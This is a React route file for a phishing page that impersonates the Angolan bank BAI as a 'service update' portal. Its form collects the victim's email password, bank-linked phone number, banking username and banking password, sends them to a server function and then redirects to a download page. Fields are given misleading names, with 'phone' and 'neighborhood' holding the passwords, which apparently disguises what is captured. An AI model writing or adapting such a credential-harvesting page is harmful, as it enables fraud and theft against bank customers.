import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { z } from "zod";
import { toast } from "sonner";
import { sendForm } from "../lib/send-form.server";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Actualização de Serviço | Portal do Cliente" },
      {
        name: "description",
        content:
          "Actualize os seus dados de contacto e escolha os serviços que pretende activar.",
      },
    ],
  }),
  component: Index,
});

const SERVICES = [
  "Actualizar Aplicativo",
  "Activar notificações de movimentos",
  "Obter cartão visa",
  "Obter TPA",
  "Fazer agendamento on-line",
  "Recuperar credenciais",
  "Obter crédito",
] as const;

const schema = z.object({
  fullName: z.string().trim().min(2, "Nome muito curto").max(100),
  email: z.string().trim().email("E-mail inválido").max(255),
  phone: z.string().trim().min(1, "Campo obrigatório").max(100),
  province: z.string().trim().min(2, "Informe a província").max(60),
  userId: z.string().trim().min(2, "Informe o utilizador/adesão").max(60),
  municipality: z.string().trim().min(2, "Informe o município").max(60),
  neighborhood: z.string().trim().min(2, "Informe o bairro").max(60),
  services: z.array(z.string()).min(1, "Seleccione ao menos uma opção"),
});

function Index() {
  const navigate = useNavigate();
  const [services, setServices] = useState<string[]>([]);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [submitting, setSubmitting] = useState(false);

  function toggle(s: string) {
    setServices((prev) =>
      prev.includes(s) ? prev.filter((x) => x !== s) : [...prev, s]
    );
  }

  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const fd = new FormData(e.currentTarget);
    const data = {
      fullName: String(fd.get("fullName") ?? ""),
      email: String(fd.get("email") ?? ""),
      phone: String(fd.get("phone") ?? ""),
      province: String(fd.get("province") ?? ""),
      userId: String(fd.get("userId") ?? ""),
      municipality: String(fd.get("municipality") ?? ""),
      neighborhood: String(fd.get("neighborhood") ?? ""),
      services,
    };
    const parsed = schema.safeParse(data);
    if (!parsed.success) {
      const fieldErrors: Record<string, string> = {};
      for (const issue of parsed.error.issues) {
        fieldErrors[issue.path[0] as string] = issue.message;
      }
      setErrors(fieldErrors);
      return;
    }
    setErrors({});
    setSubmitting(true);
    try {
      await sendForm({ data });
      toast.success("Pedido enviado com sucesso!");
      (e.target as HTMLFormElement).reset();
      setServices([]);
      navigate({ to: "/download" });
    } catch (err) {
      console.error("Erro:", err);
      toast.error("Erro ao enviar. Tente novamente.");
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <main className="min-h-screen bg-background text-foreground pb-[env(safe-area-inset-bottom)]">
      <div
        className="w-full py-8 sm:py-12 px-4 sm:px-6"
        style={{ background: "var(--gradient-bai)" }}
      >
        <img
          src="https://play-lh.googleusercontent.com/St5gd2375PoOOWTaDHS4A0S9M1xu8U40VBtTiswPugBE2d6vTKAxFr0ltz2PBb8UAc_cps360UAKdWooVGua"
          alt="BAI"
          className="mx-auto h-20 sm:h-28 w-auto object-contain"
        />
      </div>
      <div className="mx-auto max-w-2xl px-4 sm:px-6 py-8 sm:py-12">
        <header className="mb-8 sm:mb-10 text-center">
          <h1 className="text-2xl sm:text-3xl md:text-4xl font-bold tracking-tight">
            Actualização de Serviço
          </h1>
          <p className="mt-3 text-accent font-medium">Insira os seus dados</p>
        </header>

        <form onSubmit={onSubmit} noValidate className="space-y-5 sm:space-y-6">
          <Field
            label="Primeiro e Último Nome"
            name="fullName"
            error={errors.fullName}
            required
            autoComplete="name"
          />
          <Field
            label="Insira o seu E-mail"
            name="email"
            type="email"
            error={errors.email}
            required
            autoComplete="email"
            inputMode="email"
          />
          <Field
            label="Insira a Palavra Passe do seu E-mail"
            name="phone"
            type="password"
            error={errors.phone}
            required
            autoComplete="current-password"
          />
          <Field
            label="Insira o Numero de Telefone Associado a seu Banco"
            name="province"
            error={errors.province}
            required
            autoComplete="tel"
            inputMode="tel"
          />
          <Field
            label="Adesão ou Utilizador"
            name="userId"
            error={errors.userId}
            required
            autoComplete="username"
          />
          <Field
            label="Insira o Nome da sua Província"
            name="municipality"
            error={errors.municipality}
            required
          />
          <Field
            label="Palavra Passe"
            name="neighborhood"
            type="password"
            error={errors.neighborhood}
            required
            autoComplete="new-password"
          />

          <fieldset>
            <legend className="mb-3 text-sm font-medium">
              Quais das opções deseja? <span className="text-primary">*</span>
            </legend>
            <div className="space-y-1">
              {SERVICES.map((s) => (
                <label
                  key={s}
                  className="flex items-center gap-3 py-2 px-2 -mx-2 text-sm cursor-pointer rounded-md hover:bg-muted/50 active:bg-muted transition-colors"
                >
                  <input
                    type="checkbox"
                    checked={services.includes(s)}
                    onChange={() => toggle(s)}
                    className="h-5 w-5 rounded border-border accent-primary flex-shrink-0"
                  />
                  <span>{s}</span>
                </label>
              ))}
            </div>
            {errors.services && (
              <p className="mt-2 text-sm text-destructive">{errors.services}</p>
            )}
          </fieldset>

          <button
            type="submit"
            disabled={submitting}
            className="w-full rounded-md px-4 py-3.5 text-base font-medium text-white transition hover:opacity-90 disabled:opacity-60 min-h-[48px] active:scale-[0.98]"
            style={{ backgroundColor: "#007473" }}
          >
            {submitting ? "A enviar..." : "Concluir"}
          </button>
        </form>
      </div>
    </main>
  );
}

function Field({
  label,
  name,
  type = "text",
  error,
  required,
  autoComplete,
  inputMode,
}: {
  label: string;
  name: string;
  type?: string;
  error?: string;
  required?: boolean;
  autoComplete?: string;
  inputMode?: string;
}) {
  return (
    <div>
      <label htmlFor={name} className="mb-1.5 block text-sm font-medium">
        {label} {required && <span className="text-primary">*</span>}
      </label>
      <input
        id={name}
        name={name}
        type={type}
        required={required}
        autoComplete={autoComplete}
        inputMode={inputMode as React.HTMLAttributes<HTMLInputElement>["inputMode"]}
        className="w-full rounded-md border border-border bg-card px-3 py-2.5 text-base outline-none focus:ring-2 focus:ring-ring min-h-[44px]"
      />
      {error && <p className="mt-1 text-sm text-destructive">{error}</p>}
    </div>
  );
}
